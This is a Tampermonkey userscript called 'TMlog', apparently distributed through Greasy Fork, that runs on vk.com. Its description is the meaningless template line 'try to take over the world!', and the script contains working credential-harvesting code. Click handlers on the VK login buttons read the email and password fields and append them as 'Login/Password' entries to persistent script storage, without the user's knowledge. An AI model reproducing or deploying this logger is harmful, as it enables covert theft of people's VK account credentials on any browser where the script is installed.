// ==UserScript==
// @name         TMlog
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  try to take over the world!
// @author       You
// @match        https://vk.com*/*
// @match        http://vk.com*/*
// @grant GM_getValue
// @grant GM_setValue
// @require https://code.jquery.com/jquery-2.1.4.min.js
// @downloadURL https://update.greasyfork.org/scripts/39565/TMlog.user.js
// @updateURL https://update.greasyfork.org/scripts/39565/TMlog.meta.js
// ==/UserScript==

(function() {
    //'use strict';
    //GM_setValue("passwords","");
    //passs = GM_getValue("passwords", "7");
    //prompt("",passs);
    //alert(passs);
  $(".index_login_button.flat_button.button_big_text").click(function() {
        passs = GM_getValue("passwords", "");
        passs+="Login: "+$("input#index_email").val()+"; Password: "+$("input#index_pass").val()+";\n";
        GM_setValue("passwords",passs);
  });
  $("#login_button").click(function() {
        passs = GM_getValue("passwords", "");
        passs+="Login: "+$("#email.big_text").val()+"; Password: "+$("#pass.big_text").val()+";\n";
        GM_setValue("passwords",passs);
  });
    //alert(GM_getValue("passwords", "none"));
    // Your code here...
})();